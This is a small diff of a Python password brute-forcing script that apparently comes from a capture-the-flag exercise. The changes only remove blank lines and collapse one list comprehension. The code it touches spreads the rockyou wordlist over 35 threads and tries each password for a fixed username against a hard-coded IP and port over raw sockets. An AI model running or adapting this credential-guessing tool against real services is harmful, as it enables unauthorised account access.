@@ -7,7 +7,6 @@ import threading
 host = "157.230.179.99" # IP address here
 port = 1337 # Port here
 wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
-
 username = "ejnorman84"
 regex = r"(?P<firstNum>(\d)*)\s(?P<op>([\+\-\*\/]))\s(?P<secNum>(\d)*)"
 ops = { "+": operator.add, "-": operator.sub, "*": operator.mul, "/": operator.floordiv }
@@ -21,9 +20,7 @@ def create_threads(t, passwords):
 	if m:
 		xs[t-1:] = [passwords[-m-x:]]
 	assert(sum([len(l) for l in xs]) == n)
-	return [
-		threading.Thread(target=run_brute_force, args=(l)) for l in xs
-	]
+	return [threading.Thread(target=run_brute_force, args=(l)) for l in xs]
 
 def run_brute_force(*passwords):
 	global pw_find
@@ -36,7 +33,6 @@ def run_brute_force(*passwords):
 				pw_find = True
 
 def brute_force(pw):
-
 	print(" Trying Passowrd: " + pw)
 
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -90,7 +86,6 @@ def brute_force(pw):
 if __name__ == '__main__':
 	file = open(wordlist,"r")
 	passwords = file.readlines()
-
 	thread_list = create_threads(35,passwords)
 
 	for thread in thread_list:
